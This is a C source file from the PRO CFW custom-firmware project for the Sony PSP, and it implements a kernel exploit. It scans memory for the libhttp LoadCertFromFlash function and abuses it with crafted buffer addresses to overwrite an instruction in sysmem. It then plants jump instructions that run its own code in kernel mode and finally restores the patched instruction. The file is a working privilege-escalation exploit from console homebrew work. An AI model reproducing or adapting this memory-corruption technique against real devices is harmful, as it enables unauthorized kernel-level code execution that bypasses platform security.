/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputility_modules.h>
#include <pspumd.h>
#include <module2.h>
#include <lflash0.h>
#include <macros.h>
#include <rebootconfig.h>
#include <systemctrl_se.h>
#include "kxploit.h"
#include "libs/debug/graphics.h"
#include "loader/encLoader/encryptloader.h"

extern FunctionTable *g_tbl;

// libhttp.prx Stubs Mapping
#ifdef GAME_HTTP_TEXT
int (* LoadCertFromFlash)(int, int, int, int, int, int) = (void *)(GAME_HTTP_TEXT + HTTP_LOAD_CERT_FROM_FLASH);
#else
int (* LoadCertFromFlash)(int, int, int, int, int, int) = NULL;
#endif

// Find libhttp.prx LoadCertFromFlash Stub
void * FindLoadCertFromFlash(void)
{
	// Search Start Position
	unsigned int * start = (unsigned int *)GAME_TEXT;
	
	// Search Force End Position
	unsigned int * end = (unsigned int *)(USER_BASE + USER_SIZE);
	
	// Current Position in RAM
	unsigned int * p = start;
	
	// Scan Memory
	for(; p < end - 5; p += 64)
	{
		// Found libhttp.prx Text Address
		if (*p == 0x10C00028 && \
				*(p+1) == 0x00001021 && \
				*(p+4) == 0x2409003D && \
				*(p+5) == 0x90AA0000)
			break;
	}
	
	// Didn't find it... :(
	if(p >= end - 5) return NULL;
	
	// Calculate LoadCertFromFlash Stub Address
	p += HTTP_LOAD_CERT_FROM_FLASH / 4;
	
	// Return it. :D
	return p;
}

// Load required Libraries for LoadCertFromFlash (HTTP and SSL Libraries)
int stubScanner(void)
{
	if (LoadCertFromFlash != NULL)
		return 0;
	
	#ifdef USE_GAME_UTILITY_LOAD_MODULE
	
	// Load Modules via sceUtilityLoadModule (if available)
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON);	// 0x100
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);	// 0x102
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_PARSEURI);	// 0x103
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_PARSEHTTP);	// 0x104
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_SSL);	// 0x106
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_HTTP);	// 0x105

	#else
	
	#ifdef USE_GAME_UTILITY_LOAD_NET_MODULE
	
	// Load Modules via sceUtilityLoadNetModule (if available)
	g_tbl->UtilityLoadNetModule(PSP_NET_MODULE_COMMON);	// 1
	g_tbl->UtilityLoadNetModule(PSP_NET_MODULE_INET);	// 3
	g_tbl->UtilityLoadNetModule(PSP_NET_MODULE_PARSEURI);	// 4
	g_tbl->UtilityLoadNetModule(PSP_NET_MODULE_PARSEHTTP);	// 5
	g_tbl->UtilityLoadNetModule(PSP_NET_MODULE_SSL);	// 7
	g_tbl->UtilityLoadNetModule(PSP_NET_MODULE_HTTP);	// 6
	
	#endif
	
	#endif
	
	// Find PEM Certificate Loader in Memory
	LoadCertFromFlash = FindLoadCertFromFlash();

	if (LoadCertFromFlash == NULL)
		return -1;

	return 0;
}

int doExploit(void)
{
	int ret, errCode = 0;
	
#if KXPLOIT_TARGET_CHOICE == CERT_LIBC_TIME_JALR_NOP
	void *buf = (void*)0x04010004;	// b 0x12
#elif KXPLOIT_TARGET_CHOICE == CERT_SYSMEMUSERFORUSER_91DE343C
	void *buf = (void*)JUMP(CERT_VRAM_JUMP_ADDRESS);
#endif
	
	void *output = buf - CERTLOADER_WRITE_ADDR_OFFSET;
	void *sysmemAddr = (void*)SYSMEM_TEXT + KXPLOIT_TARGET_INSTR_ADDR;
	
	// Set the Patch Target Address (jalr $a1 in sceKernelLibcTime)
	_sw((u32)(sysmemAddr - 4), CERTLOADER_STRING_VULNERABILITY + 4);
	
	ret = LoadCertFromFlash(0, 0, (unsigned int)output + CERTLOADER_BUF_OFFSET, (unsigned int)output, CERTLOADER_BUF_SIZE, 0);
	

	if ( ret == SCE_ERROR_OUT_OF_MEMORY )
	{
	
	#if KXPLOIT_TARGET_CHOICE == CERT_SYSMEMUSERFORUSER_91DE343C
		// write our kcode to execute
		const u32 instr = JUMP(&kernelContentFunction);
		
		_sw(0x8FBF0004, CERT_VRAM_JUMP_ADDRESS + 0);	//	lw $ra, 4($sp)	: recover syscall's return address
		_sw(0x27BD0010, CERT_VRAM_JUMP_ADDRESS + 4);	//	addiu $sp, $sp, 16	: restore syscall's stack
		_sw(instr, CERT_VRAM_JUMP_ADDRESS + 8);	//	now let's run our kernel code
		_sw(NOP, CERT_VRAM_JUMP_ADDRESS + 12);
	#endif
		
	}
	else
	{
		//PRTSTR0("Error: LoadCertFromFlash exploit failed");
		errCode = -1;
	}
	
	return errCode;
}

void executeKernel(void)
{
#if KXPLOIT_TARGET_CHOICE == CERT_LIBC_TIME_JALR_NOP
	g_tbl->KernelLibcTime(0, 0, 0, 0, KERNELIFY(kernelContentFunction));
#elif KXPLOIT_TARGET_CHOICE == CERT_SYSMEMUSERFORUSER_91DE343C
	g_tbl->SysMemUserForUser_91DE343C( NULL );
#endif
}

void repairInstruction(void)
{
#ifdef KXPLOIT_TARGET_INSTR_ADDR
	// Fix hacked Function
	_sw(NOP, SYSMEM_TEXT + KXPLOIT_TARGET_INSTR_ADDR);
#endif
}
